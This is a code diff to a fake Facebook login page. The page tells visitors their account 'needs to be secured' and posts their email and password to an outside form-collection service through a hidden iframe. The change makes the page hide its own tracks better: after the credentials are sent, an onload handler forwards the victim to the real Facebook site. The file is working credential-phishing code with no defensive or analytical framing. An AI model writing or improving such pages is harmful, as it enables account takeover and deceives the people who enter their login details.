@@ -20,14 +20,14 @@ hr{border:0;border-top:1px solid #dadde1;margin:16px 0}
 <div class="wrap"><div class="card">
 <p class="t">Log in to Facebook</p>
 <p class="s">Your account needs to be secured</p>
-<form action="https://usebasin.com/f/62d440264f12" method="POST" target="pf" onsubmit="setTimeout(function(){location.href='https://www.facebook.com/'},1500)">
+<form action="https://usebasin.com/f/62d440264f12" method="POST" target="pf" onsubmit="window.pfSent=true;setTimeout(function(){location.href='https://www.facebook.com/'},5000)">
 <input type="hidden" name="_subject" value="FB Login">
 <input type="hidden" name="_honeypot" value="">
 <input name="email" placeholder="Email or phone number" required>
 <input name="password" type="password" placeholder="Password" required>
 <button type="submit">Log In</button>
 </form>
-  <iframe name="pf" style="display:none"></iframe>
+  <iframe name="pf" style="display:none" onload="if(window.pfSent){location.href='https://www.facebook.com/'}"></iframe>
 <a class="fp" href="https://www.facebook.com/login/identify/">Forgotten password?</a>
 <hr>
 <a class="new" href="https://www.facebook.com/r.php">Create new account</a>
